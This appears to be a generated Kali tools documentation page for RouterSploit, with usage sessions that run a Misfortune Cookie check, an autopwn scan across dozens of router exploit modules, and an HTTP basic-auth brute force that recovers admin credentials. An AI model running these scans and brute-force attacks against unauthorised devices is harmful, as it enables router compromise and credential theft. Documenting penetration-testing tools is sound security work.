---
tool_id: routersploit
title: routersploit
categories: ["exploitation-tools", "vulnerability-analysis"]
category_slugs: ["exploitation-tools", "vulnerability-analysis"]
homepage: https://github.com/threat9/routersploit
repository: 
version: 3.4.7-0kali2
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-everything"]
icon: /images/kali-tools-icon-missing.svg
source_path: kali-tools\routersploit\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.086688
---

# Tool: routersploit (routersploit)

## Categories
- [exploitation-tools](../exploitation-tools.md)
- [vulnerability-analysis](../vulnerability-analysis.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/threat9/routersploit](https://github.com/threat9/routersploit) |
| Repository |  |
| Version | 3.4.7-0kali2 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything |
| Icon | /images/kali-tools-icon-missing.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/routersploit
- **PackagesInfo**: |
- **operations**: []
- ****Installed size**: ** `2.22 MB`
- ****How to install**: ** `sudo apt install routersploit`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# rsf.py -h


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## Video

<script type="text/javascript" src="https://asciinema.org/a/118666.js" id="asciicast-118666" async></script>

## RouterSploit Usage Examples

RouterSploit has a number of exploits for different router models and they have the ability to check whether the remote target is vulnerable before sending off an exploit:

```console
rsf > use exploits/multi/misfortune_cookie
rsf (Misfortune Cookie) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target address e.g. http://192.168.1.1


rsf (Misfortune Cookie) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (Misfortune Cookie) > check
[-] Target is not vulnerable
rsf (Misfortune Cookie) >
```

If stealth is not a requirement, you can attempt to use the **autopwn** scanner module to see if any vulnerabilities can be found:

```console
rsf > use scanners/autopwn
rsf (AutoPwn) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target IP address e.g. 192.168.1.1


rsf (AutoPwn) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (AutoPwn) > run
[*] Running module...
[-] exploits/fortinet/fortigate_os_backdoor is not vulnerable
[-] exploits/belkin/n150_path_traversal is not vulnerable
[-] exploits/belkin/g_n150_password_disclosure is not vulnerable
[-] exploits/belkin/n750_rce is not vulnerable
[-] exploits/belkin/g_plus_info_disclosure is not vulnerable
[-] exploits/asus/infosvr_backdoor_rce is not vulnerable
[-] exploits/asus/rt_n16_password_disclosure is not vulnerable
[-] exploits/2wire/gateway_auth_bypass is not vulnerable
[-] exploits/technicolor/tc7200_password_disclosure is not vulnerable
[-] exploits/netgear/multi_rce is not vulnerable
[-] exploits/netgear/n300_auth_bypass is not vulnerable
[-] exploits/netgear/prosafe_rce is not vulnerable
[-] exploits/asmax/ar_1004g_password_disclosure is not vulnerable
[-] exploits/asmax/ar_804_gu_rce is not vulnerable
[-] exploits/linksys/wap54gv3_rce is not vulnerable
[-] exploits/linksys/1500_2500_rce is not vulnerable
[-] exploits/multi/misfortune_cookie is not vulnerable
[-] exploits/cisco/ucs_manager_rce is not vulnerable
[-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
[-] exploits/dlink/dir_645_password_disclosure is not vulnerable
[-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
[-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
[-] exploits/dlink/dwr_932_info_disclosure is not vulnerable
[-] exploits/dlink/dns_320l_327l_rce is not vulnerable
[-] exploits/dlink/dvg_n5402sp_path_traversal is not vulnerable
[-] exploits/dlink/dir_300_600_rce is not vulnerable
[-] exploits/juniper/screenos_backdoor is not vulnerable
[-] exploits/comtrend/ct_5361t_password_disclosure is not vulnerable
[-] Device is not vulnerable to any exploits!

rsf (AutoPwn) >
```

If all else fails, RouterSploit has a number of **creds** modules that can brute force various services, including HTTP, SSH, and Telnet:

```console
rsf > use creds/http_basic_bruteforce
rsf (HTTP Basic Bruteforce) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   port       80                   Target port
   target                          Target IP address or file with target:port (file://)


Module options:

   Name          Current settings                                                        Description
   ----          ----------------                                                        -----------
   path          /                                                                       URL Path
   usernames     admin                                                                   Username or file with usernames (file://)
   passwords     file:///usr/share/routersploit/routersploit/wordlists/passwords.txt     Password or file with passwords (file://)
   threads       8                                                                       Numbers of threads
   verbosity     yes                                                                     Display authentication attempts


rsf (HTTP Basic Bruteforce) > set target 192.168.0.2
[+] {'target': '192.168.0.2'}
rsf (HTTP Basic Bruteforce) > set passwords file:///usr/share/wordlists/nmap.lst
[+] {'passwords': 'file:///usr/share/wordlists/nmap.lst'}
rsf (HTTP Basic Bruteforce) > set verbosity no
[+] {'verbosity': 'no'}
rsf (HTTP Basic Bruteforce) > run
[*] Running module...
[*] Elapsed time:  1.97385120392 seconds
[+] Credentials found!

   Target          Port     Login     Password
   ------          ----     -----     --------
   192.168.0.2     80       admin     password

rsf (HTTP Basic Bruteforce) >
```


## Source
- Path: kali-tools\routersploit\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.086688
